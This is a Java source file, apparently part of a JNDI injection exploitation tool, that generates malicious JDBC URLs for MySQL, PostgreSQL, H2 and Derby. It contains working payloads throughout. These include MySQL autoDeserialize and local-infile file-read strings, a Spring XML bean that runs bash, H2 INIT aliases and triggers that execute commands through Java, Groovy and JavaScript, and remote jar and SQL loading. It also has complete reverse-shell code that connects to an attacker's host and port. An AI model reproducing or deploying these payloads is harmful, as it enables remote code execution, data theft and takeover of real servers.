package map.jndi.controller;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import map.jndi.Config;
import map.jndi.annotation.JNDIMapping;
import map.jndi.server.WebServer;
import map.jndi.template.DerbyJarTemplate;
import map.jndi.template.SoundbankTemplate;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

public abstract class DatabaseController implements Controller {
    @JNDIMapping("/MySQL/Deserialize{n}/{host}/{port}/{user}")
    public Properties mysqlDeserialize(String n, String host, String port, String user) throws Exception {
        System.out.println("[MySQL] [Deserialize] Host: " + host + " Port: " + port + " User: " + user);
        String url;

        // 反序列化
        switch (n) {
            case "1":
                // detectCustomCollations
                // 5.1.19-5.1.48, 6.0.2-6.0.6
                url = "jdbc:mysql://" + host + ":" + port + "/test?detectCustomCollations=true&autoDeserialize=true&user=" + user;
                break;
            case "2":
                // ServerStatusDiffInterceptor
                // 5.1.11-5.1.48
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            case "3":
                // ServerStatusDiffInterceptor
                // 6.0.2-6.0.6
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            case "4":
                // ServerStatusDiffInterceptor
                // 8.0.7-8.0.19
                url = "jdbc:mysql://" + host + ":" + port + "/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user;
                break;
            default:
                throw new Exception("Unknown MySQL payload");
        }

        Properties props = new Properties();
        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/MySQL/FileRead/{host}/{port}/{user}")
    public Properties mysqlFileRead(String host, String port, String user) {
        System.out.println("[MySQL] [FileRead] Host: " + host + " Port: " + port + " User: " + user);

        // 客户端任意文件读取 (全版本)
        String url = "jdbc:mysql://" + host + ":" + port + "/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=" + user;

        Properties props = new Properties();
        props.setProperty("driver", "com.mysql.jdbc.Driver"); // 高版本 MySQL 驱动 jar 仍然保留了这个类以确保兼容性
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/PostgreSQL/Command/{cmd}")
    public Properties postgresqlCommand(String cmd) {
        System.out.println("[PostgreSQL] Cmd: " + cmd);

        String fileName = MiscUtil.getRandStr(12) + ".xml";
        String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value>bash</value>\n" +
                "            <value>-c</value>\n" +
                "            <value><![CDATA[" + cmd + "]]></value>\n" +
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";
        WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());

        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = Config.codebase + fileName;
        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/Java/Command/{cmd}")
    public Properties h2JavaCommand(String cmd) {
        System.out.println("[H2] [Java] [Command] Cmd: " + cmd);

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"})\\;}'\\;".replace("COMMAND", cmd) +
                "CALL EXEC ('" + cmd + "')\\;";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/Java/ReverseShell/{host}/{port}")
    public Properties h2JavaReverseShell(String host, String port) {
        System.out.println("[H2] [Java] [ReverseShell] Host: " + host + " Port: " + port);

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=CREATE ALIAS REV_SHELL AS 'void rev_shell(String host, String port) throws java.lang.Exception {String shell=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;Process p=new ProcessBuilder(shell).redirectErrorStream(true).start()\\;java.net.Socket s=new java.net.Socket(host,Integer.valueOf(port))\\;java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(Exception e){}}p.destroy()\\;s.close()\\;}'\\;" +
                "CALL REV_SHELL ('" + host + "', '" + port + "')\\;";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/Groovy/Command/{cmd}")
    public Properties h2GroovyCommand(String cmd) {
        System.out.println("[H2] [Groovy] [Command] Cmd: " + cmd);

        String groovy = "@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"}) }) def x".replace("COMMAND", cmd);
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/JavaScript/Command/{cmd}")
    public Properties h2JavaScriptCommand(String cmd) {
        System.out.println("[H2] [JavaScript] [Command] Cmd: " + cmd);

        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? [\"cmd.exe\", \"/c\", \"COMMAND\"] : [\"sh\", \"-c\", \"COMMAND\"])".replace("COMMAND", cmd);
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/JavaScript/ReverseShell/{host}/{port}")
    public Properties h2JavaScriptReverseShell(String host, String port) {
        System.out.println("[H2] [JavaScript] [ReverseShell] Host: " + host + " Port: " + port);

        String javascript = "//javascript\nvar shell=java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;var p=new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start()\\;var s=new java.net.Socket(\"" + host + "\"," + port + ")\\;var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;var po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;java.lang.Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(e){}}p.destroy()\\;s.close()\\;";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/JRE/Soundbank/Command/{cmd}")
    public Properties h2JRESoundbankCommand(String cmd) {
        System.out.println("[H2-JRE] [Command] Cmd: " + cmd);

        String className = MiscUtil.getRandStr(12);
        String jarName = MiscUtil.getRandStr(12) + ".jar";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(SoundbankTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), className);
            ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));

            jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.getInstance().serveFile("/" + jarName, jarBytes);

        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
        String sqlContent = "CREATE ALIAS NEW_INSTANCE FOR 'org.h2.util.Utils.newInstance(java.lang.String, java.lang.Object[])';\n" +
                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
                "CREATE ALIAS GET_SOUNDBANK FOR 'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)';\n" +
                "SET @clazz = 'java.net.URL';\n" +
                "SET @url_str = '" + Config.codebase + jarName + "';\n" +
                "SET @url_obj = UNESCAPE_VALUE(@url_str);\n" +
                "SET @obj = NEW_INSTANCE(@clazz, @url_obj);\n" +
                "CALL SET_PROPERTY('jdk.sound.jarsoundbank', 'true');\n" +
                "CALL GET_SOUNDBANK(@obj);";
        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);
        return props;
    }

    @JNDIMapping("/H2/JRE/Spring/Command/{cmd}")
    public Properties h2JRESpringCommand(String cmd) {
        System.out.println("[H2-JRE] [Spring] [Command] Cmd: " + cmd);

        String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
        String xmlContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value>bash</value>\n" +
                "            <value>-c</value>\n" +
                "            <value><![CDATA[" + cmd + "]]></value>\n" +
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";
        WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());

        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
        String sqlContent = "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';\n" +
                "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                "\n" +
                "SET @url_str='" + Config.codebase + xmlFileName + "';\n" +
                "SET @url_obj=UNESCAPE_VALUE(@url_str);\n" +
                "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');\n" +
                "SET @string_clazz=CLASS_FOR_NAME('java.lang.String');\n" +
                "\n" +
                "CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);";
        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Create/{database}")
    public Properties derbyCreate(String database) {
        System.out.println("[Derby] [Create] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Drop/{database}")
    public Properties derbyDrop(String database) {
        System.out.println("[Derby] [Drop] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";drop=true";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Slave/{database}/{host}/{port}")
    public Properties derbySlave(String host, String port, String database) {
        System.out.println("[Derby] [Slave] Host: " + host + " Port: " + port + " Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Install/{database}")
    public Properties derbyInstall(String database) throws Exception {
        System.out.println("[Derby] [Install] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        byte[] jarBytes = JarUtil.create(className, clazz.toBytecode());
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);

        List<String> list = new ArrayList<>();
        list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + className + ".jar', 'APP." + className + "', 0)");
        list.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
        list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
        list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", String.join(";", list));

        return props;
    }

    @JNDIMapping("/Derby/Command/{database}/{cmd}")
    public Properties derbyCommand(String database, String cmd) {
        System.out.println("[Derby] [Command] Cmd: " + cmd);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CALL cmd('" + cmd  + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/ReverseShell/{database}/{host}/{port}")
    public Properties derbyReverseShell(String database, String host, String port) {
        System.out.println("[Derby] [ReverseShell] Host: " + host + " Port: " + port);

        String url = "jdbc:derby:" + database + ";create=true";
        String sql = "CALL rev('" + host + "', '" + port + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }
}
